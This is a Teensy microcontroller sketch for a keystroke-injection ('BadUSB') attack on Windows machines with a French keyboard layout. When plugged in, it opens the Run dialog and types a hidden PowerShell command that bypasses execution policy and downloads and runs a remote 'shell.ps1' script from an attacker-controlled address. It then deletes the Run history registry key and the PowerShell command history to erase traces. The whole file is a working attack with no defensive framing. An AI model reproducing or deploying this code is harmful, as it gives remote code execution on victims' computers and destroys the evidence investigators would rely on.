// *    - Board            : Teensy (3.2)
// *    - USB Type         : Keyboard + Mouse + Joystick
// *    - Keyboard Layout  : French (AZERTY)
#include <Keyboard.h>

const unsigned int BOOT_DELAY  = 3000;
const unsigned int RUN_DELAY   = 1200;
const unsigned int TYPE_DELAY  = 80;
const unsigned int KEY_DELAY   = 100;
const unsigned int EXEC_DELAY  = 3000;
const unsigned int CLEAN_DELAY = 2000;

const char PAYLOAD[] =
  "powershell -w h -nop -ExecutionPolicy Bypass -c "
  "\"&(IEX (New-Object Net.WebClient).DownloadString('http://172.20.10.4:8080/shell.ps1'))\"";


void setup() {
  delay(BOOT_DELAY);

  pressWinR();
  delay(RUN_DELAY);
  typeSlowly(PAYLOAD);
  delay(KEY_DELAY);
  pressEnter();
  delay(EXEC_DELAY);
  delay(CLEAN_DELAY);
  cleanupTraces();
  Keyboard.end();
}

void loop() { }

void pressWinR() {
  Keyboard.press(KEY_LEFT_GUI);
  delay(KEY_DELAY);
  Keyboard.press('r');
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY);
}

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY);
}

void typeSlowly(const char* str) {
  while (*str) {
    Keyboard.print(*str);
    delay(TYPE_DELAY);
    str++;
  }
}

void cleanupTraces() {
  pressWinR();
  delay(RUN_DELAY);

  typeSlowly(
    "powershell -w h -nop -c \""
    "ri 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU'"
    " -Recurse -Force -EA 0;"
    "ri \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine"
    "\\ConsoleHost_history.txt\\\" -Force -EA 0"
    "\""
  );
  delay(KEY_DELAY);
  pressEnter();
}